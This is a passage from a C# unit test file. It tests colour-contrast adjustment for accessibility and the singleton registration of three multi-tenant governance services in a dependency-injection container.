    public void AutoAdjustToneForContrast_LightensDarkForegroundOnDarkBackground()
    {
        // Low contrast dark text on dark slate background
        var darkForeground = "#1E293B"; // Slate 800
        var darkBackground = "#0F172A"; // Slate 900

        var adjusted = _brandingService.AutoAdjustToneForContrast(darkForeground, darkBackground, targetRatio: 4.5);

        var newRatio = _brandingService.CalculateContrastRatio(adjusted, darkBackground);
        newRatio.Should().BeGreaterThanOrEqualTo(4.5);
    }

    [Fact]
    public void AutoAdjustToneForContrast_PreservesCompliantColors()
    {
        // Already passes AA (Black on White)
        var foreground = "#000000";
        var background = "#FFFFFF";

        var adjusted = _brandingService.AutoAdjustToneForContrast(foreground, background, targetRatio: 4.5);

        adjusted.Should().Be("#000000");
    }

    #endregion

    #region 12. Direct ServiceCollection Registration (No BuildServiceProvider)

    [Fact]
    public void AddSovereignGovernanceServices_RegistersCustomDomainAcmeSslAutopilot_AsSingleton()
    {
        var services = new ServiceCollection();

        services.AddSovereignGovernanceServices();

        services.Should().Contain(d =>
            d.ServiceType == typeof(ICustomDomainAcmeSslAutopilot) &&
            d.ImplementationType == typeof(CustomDomainAcmeSslAutopilot) &&
            d.Lifetime == ServiceLifetime.Singleton);
    }

    [Fact]
    public void AddSovereignGovernanceServices_RegistersZeroDowntimeTenantMigrationMesh_AsSingleton()
    {
        var services = new ServiceCollection();

        services.AddSovereignGovernanceServices();

        services.Should().Contain(d =>
            d.ServiceType == typeof(IZeroDowntimeTenantMigrationMesh) &&
            d.ImplementationType == typeof(ZeroDowntimeTenantMigrationMesh) &&
            d.Lifetime == ServiceLifetime.Singleton);
    }

    [Fact]
    public void AddSovereignGovernanceServices_RegistersMultiTenantBrandingGovernanceService_AsSingleton()
    {
        var services = new ServiceCollection();

        services.AddSovereignGovernanceServices();

        services.Should().Contain(d =>
            d.ServiceType == typeof(IMultiTenantBrandingGovernanceService) &&
            d.ImplementationType == typeof(MultiTenantBrandingGovernanceService) &&
            d.Lifetime == ServiceLifetime.Singleton);
    }

    [Fact]
    public void AddSovereignGovernanceServices_NeverCallsBuildServiceProvider()
    {
        // HARD CONSTRAINT: Assert directly on ServiceCollection descriptors without calling BuildServiceProvider()
        var services = new ServiceCollection();

        services.AddSovereignGovernanceServices();

        services.Should().HaveCount(3);
        services.Should().AllSatisfy(d => d.Lifetime.Should().Be(ServiceLifetime.Singleton));
    }

    #endregion
}
